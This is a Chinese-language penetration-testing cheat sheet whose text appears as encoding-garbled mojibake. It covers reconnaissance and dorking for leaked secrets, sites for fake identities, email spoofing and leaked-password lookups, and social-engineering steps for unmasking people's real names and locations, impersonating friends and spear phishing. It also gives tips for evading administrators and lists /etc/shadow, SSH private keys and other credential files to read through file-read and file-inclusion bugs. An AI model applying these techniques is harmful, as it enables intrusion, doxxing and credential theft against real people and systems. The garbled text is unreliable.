# PentestNote
ä¸€ä»½ç¬”è®°ï¼Œæ–¹ä¾¿æŸ¥é˜…

æ¨ è ä½¿ ç”¨  **typora** è¿›è¡Œé˜…è¯»



## è¯·å–„ç”¨æœç´¢[`Ctrl+F`]æŸ¥æ‰¾

ä¸å®šæ—¶æ›´æ–°,æƒå½“æ˜¯è®°ç¬”è®°äº†.

å¾ˆå¤šä¸œè¥¿ä¼šå…ˆåœ¨å…¬ä¼—å·è¿›è¡Œæ›´æ–°ï¼Œæœ‰éœ€è¦çš„å…ˆå…³æ³¨ã€‚

![safe6](http://qiniu.safe6.cn/qr2.png)

# å‰æœŸä¿¡æ¯æ”¶é›†



## å·¥å…·æ¨è

### å­åŸŸå

- OneForAll https://github.com/shmilylty/OneForAll	
- ksubdomainï¼šhttps://github.com/knownsec/ksubdomain
-  subDomainsBrute  https://github.com/lijiejie/subDomainsBrute



### è‡ªåŠ¨åŒ–ä¿¡æ¯æ”¶é›†

- ARL https://github.com/TophantTechnology/ARL
- 



### ç›®å½•æ‰«æ

winä¸‹é¢ç”¨å¾¡å‰‘å’Œ7kbscanå°±å¤Ÿäº†,å…³é”®å¾—çœ‹å­—å…¸å§.æˆ‘å…¬ä¼—å·ä¹‹å‰æœ‰æ¨èè¿‡

- Safe6ç›®å½•æ‰«æ https://github.com/safe6Sec/dirScan
- dirsearchï¼šhttps://github.com/maurosoria/dirsearch
- 7kbscanï¼šhttps://github.com/7kbstorm/7kbscan-WebPathBrute



###  æ‰«æå™¨

- nessusæ‰«ä¸»æœº
- awvs æ‰«web
- burp ä¸ç”¨è¯´
- nmap æ‰«ç«¯å£
- rustscan è¶…å¿«çš„ç«¯å£æ‰«æ,æ‰«å®Œè‡ªåŠ¨è°ƒç”¨nmapè¯†åˆ«æŒ‡çº¹(é€Ÿåº¦å¤ªå¿«äº†æœ‰æ—¶å€™æœ‰äº›ç«¯å£å‡ºä¸æ¥)  https://github.com/RustScan/RustScan
- xray ç»“åˆburpç”¨æ¥è¢«åŠ¨æ‰«æ https://github.com/chaitin/xray



### åœ¨çº¿å·¥å…·

#### æŒ‡çº¹

- https://www.godeye.vip/

- http://whatweb.bugscaner.com/look 

- http://finger.tidesec.net/
- https://phonebook.cz/ ç›®æ ‡èµ„äº§ï¼Œå¦‚é‚®ç®±

#### ç½‘ç»œç©ºé—´æœç´¢å¼•æ“

- https://quake.360.cn/
- https://fofa.so/
- https://www.zoomeye.org/
- https://www.shodan.io/

#### ç»¼åˆæ‰«æ

- https://scan.top15.cn/web/
- https://pentest-tools.com/information-gathering/google-hacking#

#### å­åŸŸ/æ—ç«™

- https://phpinfo.me/old/domain
- https://webscan.cc/
- https://dnsdumpster.com/
- https://www.yougetsignal.com/tools/web-sites-on-web-server/
- https://www.robtex.com/
- https://www.dnsscan.cn/

#### dnså†å²è®°å½•

å¯ç”¨æ¥æ‰¾çœŸå®ip

- http://www.siteinfotool.com/
- http://toolbar.netcraft.com/site_report
- https://dnsdumpster.com/
- https://viewdns.info/iphistory/
- https://asm.ca.com/

#### åŒ¿å

- Sms
    https://www.materialtools.com/
    http://receivefreesms.com/
- Email
      https://10minutemail.net/
      https://zh.mytrashmailer.com/
      http://24mail.chacuo.net/enus
      https://www.linshiyouxiang.net/
- Fake id
      https://www.fakenamegenerator.com/
      http://www.haoweichi.com/
      https://www.fakeaddressgenerator.com/
- ipä»£ç†æ± 
- ä¸´æ—¶æ–‡ä»¶  https://bashupload.com/
- https://ppng.io/    ä¸´æ—¶æ–‡ä»¶
- torç½‘ç»œ
- https://emkei.cz/ é‚®ä»¶ä¼ªé€ 
- å…è´¹åŸŸå https://www.freenom.com/zh/index.html?lang=zh
- dns http://xip.io/
- äº‘çŸ­ä¿¡https://www.materialtools.com/

#### è£¤å­

- http://site3.sjk.space/
- https://ghostproject.fr/
- 

#### webshellæŸ¥æ€

- Dç›¾http://www.d99net.net/
- æ²³é©¬https://www.webshell.pub/
- webdir++https://scanner.baidu.com/

#### æ¶æ„è½¯ä»¶åˆ†æ

- https://www.virustotal.com/
- http://www.virscan.org/
- https://www.virscan.org/
- https://s.threatbook.cn/ äº‘æ²™ç®±
- https://habo.qq.com/
- https://ti.qianxin.com/
- https://sandbox.ti.qianxin.com/sandbox/page   qaxæ²™ç®±
- http://appscan.360.cn/ appæ‰«æ
- https://service.security.tencent.com/kingkong app
- https://www.appscan.io/ app
- https://www.ostorlab.co/   app å›½å¤–çš„
- https://app.any.run/   æœ€å¼ºæ²™ç®±

#### æ¸—é€æµ‹è¯•

- https://www.revshells.com/   åå¼¹shell  
-  https://i.hacking8.com/tiquan/  Windowsææƒè¾…åŠ©è¡¥ä¸æŸ¥è¯¢
- https://pentest-tools.com/information-gathering/google-hacking#    è°·æ­Œhackingå¤šç§

#### èµ„äº§

- https://opendata.rapid7.com/ 

#### å®ç”¨

- è§£æbashå‘½ä»¤ https://explainshell.com/
- ç»ˆç«¯å½•åˆ¶  https://asciinema.org/
- æ­£åˆ™æœç´¢ https://ihateregex.io/





## å†å²æ¼æ´

- https://cxsecurity.com/
- http://vulhub.org.cn/ (å¸¸ç”¨)
- http://cve.scap.org.cn/
- http://www.cnnvd.org.cn/
- https://vulmon.com/ (å¸¸ç”¨)
- https://sploitus.com (å¸¸ç”¨)
- https://vulners.com 
- https://www.exploit-db.com/ (å¸¸ç”¨)
- https://www.seebug.org/
- https://packetstormsecurity.com/
- https://snyk.io/vuln (å¸¸ç”¨)
- https://www.cvedetails.com/
- https://www.cvebase.com/ (å¸¸ç”¨,cveåˆ†æå’Œpoc)
- ä¹Œäº‘é•œåƒ
- https://baizesec.github.io/bylibrary/ ç™½æ³½æ–‡åº“
- https://github.com/Mr-xn/Penetration_Testing_POC poc&expå„ç§å·¥å…·



## ç›®æ ‡ç«™ç‚¹æºç è·å–æŠ€å·§

å‚è€ƒæ–‡ç« :https://www.anquanke.com/post/id/224420  å¦‚ä½•åˆ©â½¤QuakeæŒ–æ˜æŸæˆæƒâ¼šå•†è¾¹ç¼˜ç«™ç‚¹æ¼æ´



å¦‚æœç«™ç‚¹åˆ é™¤å¯¹åº”ç‰¹å¾çš„titleå…³é”®è¯ï¼Œå¯ä»¥æ ¹æ®faviconæ¥æœç´¢ä½¿ç”¨åŒå¥—ç›¸ä¼¼æ¡†æ¶çš„ç«™ç‚¹ã€‚

å½“ç„¶å‡å¦‚quakeæ²¡æœ‰ç»™å‡ºè¿™ä¸ªç«™ç‚¹çš„iconå€¼ï¼Œä½ ä¹Ÿå¯ä»¥æ ¹æ® `curl http://xxxx.com/favicon.ico|md5sum`çš„æ–¹å¼ï¼Œå¾—åˆ°ç«™ç‚¹icoçš„md5ï¼Œç„¶ååˆ©ç”¨quakeè¯­æ³•ï¼Œ`favicon:"{MD5}"`æœç´¢ã€‚

è¿æ°”è¾ƒå¥½ï¼Œåœ¨quakeçš„ç¬¬ä¸€é¡µå°±å‘ç°äº†å’Œå‚å•†ä½¿ç”¨åŒæ ·cmsï¼Œå¹¶ä¸”æ˜ç¤ºç”¨äº†ä»€ä¹ˆæ¡†æ¶çš„ç«™ç‚¹



**å¦‚ä½•åˆ©ç”¨360quakeæœç´¢ç›¸ä¼¼ç«™ç‚¹ï¼Œå¹¶è·å¾—æºç **

è¿™é‡Œä¸€èˆ¬æˆ‘ä»¬æœç´¢ç›¸ä¼¼æºç çš„ç«™ç‚¹æœ‰ä»¥ä¸‹å‡ ç§æ–¹å¼ï¼š

- 1ã€`æ ¹æ®faviconæœç´¢`
- 2ã€`æ ¹æ®é¦–é¡µé¡µé¢é‡Œçš„ä¸€äº›ç‰¹å¾ï¼Œåˆ©ç”¨body:"{ç‰¹å¾}"æ¥æœç´¢`
- 3ã€`æ ¹æ®responseé‡Œçš„headerå¤´ç‰¹å¾æ¥æœç´¢ï¼Œä¸€èˆ¬æ˜¯åœ¨cookieé‡Œæœ‰è®¾ç½®ç‰¹å®šçš„cookieã€‚æ¯”å¦‚shiroçš„rememberMe=xxxï¼Œæˆ–è€…apacheçš„ofbizã€‚`
- 4ã€`æ ¹æ®certé‡ŒIssuerã€Subjectç‰¹å¾æœç´¢ï¼Œä¸€äº›å•ä½ã€ç”šè‡³éƒ¨é—¨ä¿¡æ¯ä¼šåŒ…å«åœ¨sslè¯ä¹¦å†…å®¹ä¹‹ä¸­ã€‚`

æœç´¢åˆ°ç›¸ä¼¼ç«™ç‚¹åï¼Œæœ‰å‡ ç§æ–¹å¼æåˆ°æºç ï¼š

- 1ã€`å¯¹ç›¸ä¼¼ç«™ç‚¹è¿›è¡Œå…¥ä¾µï¼Œgetshellåè·å¾—æºç ï¼ˆåŠ¨é™è¾ƒå¤§ï¼‰`
- 2ã€`å¯¹ç›¸ä¼¼ç«™ç‚¹æ‰¹é‡æ‰«å¤‡ä»½æ–‡ä»¶`
- 3ã€`å¾—çŸ¥cmsçš„åç§°å»å‡Œé£äº‘ç½‘ç›˜æœç´¢è¯¥cmsæºç æ˜¯å¦æœ‰äººåˆ†äº«`
- 4ã€`é—²é±¼æœæœ‰æ²¡æœ‰å¯¹åº”æºç æœ‰äººåœ¨ä¹°å–`
- 5ã€`å»githubï¼Œgiteeæœæœ‰æ²¡æœ‰ç›¸ä¼¼çš„æºç ï¼Œæ˜¯å¦æ˜¯æ ¹æ®åˆ«äººçš„æºç äºŒæ¬¡å¼€å‘çš„æˆå“`






## googleè¯­æ³•

1. åå°åœ°å€

- site:xxx.xxx ç®¡ç†åå°/ç™»é™†/ç®¡ç†å‘˜/ç³»ç»Ÿ
- site:xxx.xxx inurl:login/admin/system/guanli/denglu
- site:xxx.xxx intext:"ç™»é™†"

1. æ•æ„Ÿæ–‡ä»¶

- site:xxx.xxx filetype:pdf/doc/xls/txt
- site:xxx.xxx filetype:log/sql/conf

1. æµ‹è¯•ç¯å¢ƒ

- site:xxx.xxx inurl:test/ceshi
- site:xxx.xxx intitle:æµ‹è¯•

1. é‚®ç®±/QQ/ç¾¤

- site:xxx.xxx é‚®ä»¶/email
- site:xxx.xxx qq/ç¾¤/ä¼é¹…/è…¾è®¯

1. å…¶ä»–

- site:xxx.xxx inurl:api
- site:xxx.xxx inurl:uid=/id=
- site:xxx.xxx intitle:index of

## Githubæœç´¢

- @xxx.xxx password/secret/credentials/token/config/pass/login/ftp/ssh/pwd
- @xxx.xxx security_credentials/connetionstring/JDBC/ssh2_auth_password/send_keys
- "domain.com" API_KEY
- "domain.com" login
- "domain.com" password

## å…³äºç¤¾å·¥

1. æŸ¥è¯¢whoiså¾—åˆ°ç”µè¯,é‚®ç®±,å¤‡æ¡ˆå·.å¤‡æ¡ˆå·æŸ¥æ³¨å†Œäºº

2. ç”µè¯é€šè¿‡æ”¯ä»˜å®è½¬å¸è·å–çœŸå®å§“å,åˆ©ç”¨qqåæŸ¥å¾®ä¿¡,qqæ¨æµ‹

3. ç”µè¯å·ç æ·»åŠ åˆ°é€šè®¯å½•,è®©ç¬¬ä¸‰æ–¹appé€šè¿‡é€šè®¯å½•åŒ¹é…å‡ºä¿¡æ¯(æŠ–éŸ³,æ”¯ä»˜å®,qq,å¾®ä¿¡......)

4. ç¤¾å·¥åº“,tgç¾¤æŸ¥æ³„æ¼å¯†ç 

5. æ‰‹æœºå·æŸ¥æ³¨å†Œè¿‡çš„ç½‘ç«™

   ```
   https://www.reg007.com/
   https://www.usersearch.org/
   ```

6. å¾—åˆ°ç®¡ç†å‘˜è®¾ç½®å¯†ç ä¹ æƒ¯,å‘½åä¹ æƒ¯.è¿›è¡Œçˆ†ç ´,è·‘å¤‡ä»½

7. åˆ©ç”¨ä¸ªäººä¿¡æ¯ç”Ÿæˆç¤¾å·¥å­—å…¸

8. å†’å……ç›®æ ‡å¥½å‹

9. è¿‘æºæ¸—é€,wifi,badusb

10. é±¼å‰æ”»å‡»

    1. https://mp.weixin.qq.com/s/SzKX0XrAjgo7SL2GYjtSAg å¹²è´§ ï½œ é‚®ä»¶é’“é±¼æ”»å‡»å­¦ä¹ 
    2. https://mp.weixin.qq.com/s?__biz=MjM5NzE1NjA0MQ%3D%3D&mid=2651202725&idx=1&sn=955fd4c6d80b320a57a3bc7b34fa24f8&scene=45#wechat_redirectçº¢è“å¯¹æŠ—ä¹‹é‚®ä»¶é’“é±¼æ”»å‡»
    3. https://mp.weixin.qq.com/s/aatNjey3swZz7T4Yw_LqsQ çº¢é˜Ÿæµ‹è¯•ä¹‹é‚®ç®±æ‰“ç‚¹
    4. https://mp.weixin.qq.com/s/gFkFcl2M_SI7UYmosUnTOg é‚®ä»¶é’“é±¼å¹³å°æ­å»ºä»¥åŠåŸºç¡€ä½¿ç”¨åœºæ™¯
    5. https://mp.weixin.qq.com/s/_3PpI4hKYZRPuYQs2nh67w é’“é±¼æ”»å‡»ä¸­æ–‡ä»¶çš„å‡ ç§å§¿åŠ¿

11. æ°´å‘æ”»å‡»

12. å¯é€šè¿‡å¾®åšè¿›è¡Œå®šä½,qqæŠ“ipå®šä½,å›¾ç‰‡exifå®šä½

13. å„ç§åŒ¿å

14. å¯†ç ç”Ÿæˆ

    - æ’åº“
    - å¸¸è§æ‰‹æœºå·
    - å¸¸è§ç™»å½•è´¦å·(adminã€managerã€testã€deme)
    - æ•°å­—ç»„åˆ(0-9ã€00-99ã€000-999ã€0000-9999ã€00000-99999)
    - æ‹¼éŸ³(zhangsanã€zhang.sanã€zhangs)
    - ä¸­æ–‡(å¼ ä¸‰ã€æå››ã€å¼ san)
    - è‹±æ–‡å(Tomã€Jeoã€Cherry)
    - å•ä½å(zssx123ã€zssx@123)
    - åœ°å(beijing123ã€beijing@123)
    - ç»„åˆ(åœ°å+å•ä½å)
    - åŸŸå(baidu@123ã€JD@123)
    - ç”Ÿæ—¥ç»„åˆ




## ä¸€ç‚¹å°æŠ€å·§

1. æ— å¤´ç»ªçš„æ—¶å€™,å¯ä»¥å»fofaæ‰¾ç›¸åŒç±»å‹çš„ç«™ç‚¹æ‹¿ä¸‹,ç„¶åè¿›è¡Œä»£ç å®¡è®¡.
2. ä¸»ç«™ä¸€èˆ¬æ²¡æœºä¼š,å°½é‡çš„å»æ”¶é›†ç›®æ ‡èµ„äº§(æ¸—é€æœ¬è´¨æ˜¯ä¿¡æ¯æ”¶é›†),æ²¡æœ‰æ‹¿ä¸ä¸‹çš„ç«™ç‚¹,åªè¦ä¿¡æ¯æ”¶é›†åˆ°ä½.å¦‚æœè¿˜ä¸è¡Œå°±ç¤¾å·¥.
3. é‡åˆ°éš¾å•ƒçš„éª¨å¤´,å¯ä»¥å¯¹æŠ¥403çš„ç›®å½•è¿›è¡Œæ‰«æ,ä¹Ÿè®¸ä¼šæœ‰ä¸é”™çš„æ”¶è·
   1. bypasså‚è€ƒhttps://mp.weixin.qq.com/s/_hcVp9u7OIHnYW1l7lQiCQ
4. å¤šåšæ¼æ´å¤ç°,é‡åˆ°äº†å¯¹åº”çš„æ¼æ´å°±ä¸ç”¨å»æ…¢æ…¢ç ”ç©¶
5. åœ¨è¿›è¡Œæœ‰å¯èƒ½å¯¼è‡´ç®¡ç†å‘˜å¯Ÿè§‰çš„æ•æ„Ÿæ“ä½œæ—¶ï¼ˆå¦‚ç™»å½•è¿œç¨‹æ¡Œé¢ç­‰ï¼‰ï¼Œæ ¹æ®ç›®æ ‡æ‰€åœ¨åœ°åŒºï¼Œé€‰æ‹©å¯¹åº”IPç™»å½•ã€‚ï¼ˆå¤§å¤šæ•°ä¼šæç¤ºå¼‚åœ°ç™»å½•æé†’ï¼Œå¯¼è‡´æƒé™ä¸¢å¤±ï¼‰
6. çº¢é˜Ÿç”µè„‘ä¸èƒ½ä¿å­˜ä»»ä½•ä¸ªäººä¿¡æ¯ï¼Œåœ¨æŸäº›å·¥ä½œç³»ç»Ÿè¯­è¨€ä¸è¦ä½¿ç”¨ä¸­æ–‡ï¼Œé˜²æ­¢è¢«ååˆ¶ã€‚
7. æ‹¿åˆ°æœºå™¨åŠæ—¶åšæƒé™ç»´æŒï¼Œmsfçš„è®°å¾—è‡ªåŠ¨è¿ç§»è¿›ç¨‹
8. å°½é‡å’Œç®¡ç†å‘˜å²”å¼€æ—¶é—´æ®µï¼Œä¸è¦æ’åˆ°
9. å¦‚æœå¯ä»¥ï¼Œä¸€å¤©ä¸€é¶æœºï¼Œhtbå°±ä¸é”™
10. æ‰“æŸä¸€ä¸ªè¡Œä¸šæƒ³è¦æœ‰æˆæœï¼Œæœ€å¥½è¦æ·±å…¥äº†è§£è¿™ä¸ªè¡Œä¸šï¼Œæˆ‘ä¸¾ä¸ªä¾‹å­ï¼Œæ¯”å¦‚æä¼ å¥‡/dnfè¿™ç§ç§æœçš„ï¼Œä»–ä»¬è®²ç®¡ç†å‘˜éƒ½å«gmï¼Œä¸åƒæITçš„å«adminï¼Œé‚£ä½ çˆ†ä¸€äº›ç§æœæ¸¸æˆçš„ç½‘é¡µåå°ã€ç®¡ç†è´¦å·å°±éœ€è¦æä¸€äº›è¡Œä¸šé»‘è¯ç”Ÿæˆä¸€ä¸‹ï¼Œæ¯”å¦‚/gm/æˆ–è€…/chongzhi/gm.php,ç”¨ITè¡Œä¸šçš„å­—å…¸ï¼Œæ°´åœŸä¸æœğŸ¤£ï¼Œè¿˜æœ‰è èœè¡Œä¸šï¼Œæ³¨å†Œç”¨æˆ·éœ€è¦6ä½é‚€è¯·ç ï¼Œå¾ˆå¤šéƒ½æ˜¯888888ã€666666è¿™ç§å‰åˆ©æ•°å­—ï¼Œé€†å‘ä¸€ä¸‹æ€è·¯ï¼ŒçŒœä¸€çŒœç›®æ ‡å—ä¼—å–œæ¬¢ä»€ä¹ˆã€‚|r0fus0d
11. åŸŸåèµ„äº§æ”¶é›†whoisåæŸ¥+å…„å¼ŸåŸŸå+å…¶ä»–åç¼€åŸŸå+å¤‡æ¡ˆåæŸ¥+rapid7å…¬å…±æ•°æ®é›†+jsçˆ¬å–+Githubç­‰ç¬¬ä¸‰æ–¹çˆ¬å–+subfinder+OneForAll+ksubdomainè¿‡æ»¤



## ä¸€äº›ä¿¡æ¯æ”¶é›†çš„å‘½ä»¤

#### äº’è”ç½‘cæ®µå­˜æ´»æ£€æµ‹

```bash
nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oG tmp -iL ip.txt | awk '{print $5}' | grep -v "latency)." >ok_ip.txt
```



#### apkæ•æ„Ÿä¿¡æ¯æ”¶é›†

æå–ç›¸å…³åŸŸåé“¾æ¥/IP

```
grep -E "([0-9]{1,3}[\.]){3}[0-9]{1,3}" -r xxx --color=auto
grep -E "https?://[a-zA-Z0-9\.\/_&=@$%?~#-]*" -r xxx --color=auto
```

æå–ä¸€äº›æ•æ„Ÿä¿¡æ¯

```
apktool d app_name.apk
grep -EHirn "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into" APKfolder/
```

æå–url

```
grep -ohr -E "https?://[a-zA-Z0-9\.\/_&=@$%?~#-]*" /app/ |sort|uniq >> test.txt
```





## macä¸‹åç¼–è¯‘apk



æ‰‹åŠ¨æ•²å‘½ä»¤å¤ªç¹çäº†ï¼Œå†™ä¸ª shell è„šæœ¬ä¸€é”®åŒ–ã€‚

åœ¨.bash_profile æ–‡ä»¶ï¼ˆç¯å¢ƒå˜é‡ï¼‰åŠ å…¥è¿™ä¸ªå‘½ä»¤ alias 

apkdec="/Users/chen/HackBox/Tools/Android\ Decompile/DeApkScript.sh"ï¼Œ

è¿™æ ·å½“ç»ˆç«¯æ‰“å¼€çš„æ—¶å€™å°±å¯ä»¥ä½¿ç”¨ apkdec å‘½ä»¤äº†ï¼Œè€Œè„šæœ¬ DeApkScript.sh çš„å†…

å®¹å¦‚ä¸‹ï¼š

apktool d $1 && mv $1 $1.zip && unzip $1.zip "*.dex" -d $1_dex/ && cd 

$1_dex/ && d2j-dex2jar *.dex 

åŠŸèƒ½å®ç°å¦‚ä¸‹ï¼š

â€¢ apktool è·å–èµ„æºæ–‡ä»¶

â€¢ å°† apk æ–‡ä»¶é‡å‘½åä¸º zip æ–‡ä»¶

â€¢ è§£å‹ zip æ–‡ä»¶ä¸­çš„.dex æ–‡ä»¶

â€¢ åˆ‡æ¢è§£å‹ç›®å½•

â€¢ å°† dex æ–‡ä»¶è½¬æ¢æˆ jar æ–‡ä»¶

è¿™æ ·ï¼Œæœ€ååªéœ€è¦ä½¿ç”¨ JD-GUI åç¼–è¯‘ JAR å³å¯çœ‹è§æºç äº†ã€‚



## springç›¸å…³ç¨‹åºå¿…æ‰«å­—å…¸



```
/v2/api-docs
/swagger-ui.html
/swagger
/api-docs
/api.html
/swagger-ui
/swagger/codes
/api/index.html
/api/v2/api-docs
/v2/swagger.json
/swagger-ui/html
/distv2/index.html
/swagger/index.html
/sw/swagger-ui.html
/api/swagger-ui.html
/static/swagger.json
/user/swagger-ui.html
/swagger-ui/index.html
/swagger-dubbo/api-docs
/template/swagger-ui.html
/swagger/static/index.html
/dubbo-provider/distv2/index.html
/spring-security-rest/api/swagger-ui.html
/spring-security-oauth-resource/swagger-ui.html
/mappings
/metrics
/beans
/configprops
/actuator/metrics
/actuator/mappings
/actuator/beans
/actuator/configprops
/actuator
/auditevents
/autoconfig
/beans
/caches
/conditions
/configprops
/docs
/dump
/env
/flyway
/health
/heapdump
/httptrace
/info
/intergrationgraph
/jolokia
/logfile
/loggers
/liquibase
/metrics
/mappings
/prometheus
/refresh
/scheduledtasks
/sessions
/shutdown
/trace
/threaddump
/actuator/auditevents
/actuator/beans
/actuator/health
/actuator/conditions
/actuator/configprops
/actuator/env
/actuator/info
/actuator/loggers
/actuator/heapdump
/actuator/threaddump
/actuator/metrics
/actuator/scheduledtasks
/actuator/httptrace
/actuator/mappings
/actuator/jolokia
/actuator/hystrix.stream

```







# æ¼æ´æ”»å‡»

## æ–‡ä»¶è¯»å–æ¼æ´

1ã€ä¸€èˆ¬æˆ‘æ‹¿åˆ°ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–å¾—å…ˆåˆ¤æ–­æƒé™å¤§ä¸å¤§ï¼Œå¦‚æœæƒé™å¤Ÿå¤§çš„è¯å¯ä»¥ç›´æ¥å…ˆæŠŠ/etc/sadowè¯»ä¸‹æ¥ï¼Œæƒé™ä¸å¤Ÿå°±è¯»/etc/passwdï¼Œå…ˆæŠŠç”¨æˆ·ç¡®å®šä¸‹æ¥ï¼Œæ–¹ä¾¿åç»­æ“ä½œ

2ã€è¯»å–å„ä¸ªç”¨æˆ·çš„.bash_historyèƒ½ç¿»æœ‰ç”¨çš„ä¿¡æ¯ï¼Œå¦‚ç¼–è¾‘ä¸€äº›æ•æ„Ÿæ–‡ä»¶

3ã€è¯»å–ç¨‹åºé…ç½®æ–‡ä»¶ï¼ˆå¦‚æ•°æ®åº“è¿æ¥æ–‡ä»¶,å¯ä»¥åˆ©ç”¨æ•°æ®åº“å†™shellï¼‰

4ã€è¯»å–ä¸­é—´ä»¶é…ç½®æ–‡ä»¶ï¼ˆweblogic/tomcat/apacheçš„å¯†ç æ–‡ä»¶ã€é…ç½®æ–‡ä»¶,ç¡®å®šç»å¯¹è·¯å¾„ï¼Œæ–¹ä¾¿åé¢è¯»æºç ï¼‰
5ã€è¯»å–ä¸€äº›è½¯ä»¶çš„è¿ç»´é…ç½®æ–‡ä»¶ï¼ˆredis/rsync/ftp/sshç­‰ç­‰ç¨‹åºçš„æ•°æ®ã€é…ç½®ã€æ–‡æ¡£è®°å½•ï¼‰
6ã€è¯»å–ç¨‹åºæºä»£ç ï¼Œæ–¹ä¾¿åé¢åšä»£ç å®¡è®¡ï¼Œæ‰¾çªç ´å£
7ã€è¯»å–webåº”ç”¨æ—¥å¿—æ–‡ä»¶ï¼Œä¸­é—´ä»¶çš„æ—¥å¿—æ–‡ä»¶ï¼Œå…¶ä»–ç¨‹åºçš„æ—¥å¿—ï¼Œç³»ç»Ÿæ—¥å¿—ç­‰ï¼ˆå¯ä»¥ç½‘ç«™åå°åœ°å€ã€apiæ¥å£ã€å¤‡ä»½ã€ç­‰ç­‰æ•æ„Ÿä¿¡æ¯ï¼‰
8ã€è¿˜æœ‰å°±æ˜¯å¯ä»¥ç”¨å­—å…¸å…ˆè·‘ä¸€æ³¢(å­—å…¸ä¹‹å‰æœ‰åˆ†äº«è¿‡)ï¼Œä¿¡æ¯æ”¶é›†è¿˜æ˜¯è¦å…¨é¢ç‚¹ã€‚


windowså¸¸è§çš„æ•æ„Ÿæ–‡ä»¶è·¯å¾„:

```
C:\boot.ini //æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬
C:\Windows\System32\inetsrv\MetaBase.xml //IISé…ç½®æ–‡ä»¶
C:\Windows\repair\sam //å­˜å‚¨ç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç 
C:\Program Files\mysql\my.ini //Mysqlé…ç½®
C:\Program Files\mysql\data\mysql\user.MYD //Mysql root
C:\Windows\php.ini //phpé…ç½®ä¿¡æ¯
C:\Windows\my.ini //Mysqlé…ç½®ä¿¡æ¯
C:\Windows\win.ini //Windowsç³»ç»Ÿçš„ä¸€ä¸ªåŸºæœ¬ç³»ç»Ÿé…ç½®æ–‡ä»¶
```


Linuxå¸¸è§çš„æ•æ„Ÿæ–‡ä»¶è·¯å¾„:

```
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.ssh/id_ras.keystore
/root/.ssh/known_hosts //è®°å½•æ¯ä¸ªè®¿é—®è®¡ç®—æœºç”¨æˆ·çš„å…¬é’¥
/etc/passwd
/etc/shadow
/etc/my.cnf //mysqlé…ç½®æ–‡ä»¶
/etc/httpd/conf/httpd.conf //apacheé…ç½®æ–‡ä»¶
/root/.bash_history //ç”¨æˆ·å†å²å‘½ä»¤è®°å½•æ–‡ä»¶
/root/.mysql_history //mysqlå†å²å‘½ä»¤è®°å½•æ–‡ä»¶
/proc/mounts //è®°å½•ç³»ç»ŸæŒ‚è½½è®¾å¤‡
/porc/config.gz //å†…æ ¸é…ç½®æ–‡ä»¶
/var/lib/mlocate/mlocate.db //å…¨æ–‡ä»¶è·¯å¾„
/porc/self/cmdline //å½“å‰è¿›ç¨‹çš„cmdlineå‚æ•°
```




## æ–‡ä»¶åŒ…å«æ¼æ´

**ä¸€ã€åˆ©ç”¨æ€è·¯æ€»ç»“ï¼š**

**1ã€åŒ…å«ä¸€äº›æ•æ„Ÿçš„é…ç½®æ–‡ä»¶ï¼Œè·å–ç›®æ ‡æ•æ„Ÿä¿¡æ¯**

**2ã€é…åˆå›¾ç‰‡é©¬getshell**

**3ã€åŒ…å«ä¸´æ—¶æ–‡ä»¶getshell**

**4ã€åŒ…å«sessionæ–‡ä»¶getshell**

**5ã€åŒ…å«æ—¥å¿—æ–‡ä»¶getshell(Apachã€SSHç­‰ç­‰)**

**6ã€åˆ©ç”¨phpä¼ªåè®®è¿›è¡Œæ”»å‡»**

 

**äºŒã€å…·ä½“åˆ©ç”¨æ–¹æ³•ï¼š**

**â‘ åŒ…å«ä¸€äº›æ•æ„Ÿçš„é…ç½®æ–‡ä»¶**

windowså¸¸è§çš„æ•æ„Ÿæ–‡ä»¶è·¯å¾„:
```
C:\boot.ini //æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬
C:\Windows\System32\inetsrv\MetaBase.xml //IISé…ç½®æ–‡ä»¶
C:\Windows\repair\sam //å­˜å‚¨ç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç 
C:\Program Files\mysql\my.ini //Mysqlé…ç½®
C:\Program Files\mysql\data\mysql\user.MYD //Mysql root
C:\Windows\php.ini //phpé…ç½®ä¿¡æ¯
C:\Windows\my.ini //Mysqlé…ç½®ä¿¡æ¯
C:\Windows\win.ini //Windowsç³»ç»Ÿçš„ä¸€ä¸ªåŸºæœ¬ç³»ç»Ÿé…ç½®æ–‡ä»¶
```

Linuxå¸¸è§çš„æ•æ„Ÿæ–‡ä»¶è·¯å¾„:
```
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.ssh/id_ras.keystore
/root/.ssh/known_hosts //è®°å½•æ¯ä¸ªè®¿é—®è®¡ç®—æœºç”¨æˆ·çš„å…¬é’¥
/etc/passwd
/etc/shadow
/etc/my.cnf //mysqlé…ç½®æ–‡ä»¶
/etc/httpd/conf/httpd.conf //apacheé…ç½®æ–‡ä»¶
/root/.bash_history //ç”¨æˆ·å†å²å‘½ä»¤è®°å½•æ–‡ä»¶
/root/.mysql_history //mysqlå†å²å‘½ä»¤è®°å½•æ–‡ä»¶
/proc/mounts //è®°å½•ç³»ç»ŸæŒ‚è½½è®¾å¤‡
/porc/config.gz //å†…æ ¸é…ç½®æ–‡ä»¶
/var/lib/mlocate/mlocate.db //å…¨æ–‡ä»¶è·¯å¾„
/porc/self/cmdline //å½“å‰è¿›ç¨‹çš„cmdlineå‚æ•°
```

 

**ç»å¯¹è·¯å¾„ï¼š**

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibIc2k614Bbn1libAOQhtDRX1R5Zc7npXmyBqjk9jic2TKmju4vAm2rDnA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

 

**../è·¨ç›®å½•è¯»å–ï¼š**

![img](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5u62003kUNCvqaZBl7yLbibsGB5eqaug8URYTHUngic9iaP7SdqhhT5uwXuq6yYKkdg4oDXXt3OV29A/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

 

 

**â‘¡é…åˆå›¾ç‰‡é©¬getshell**

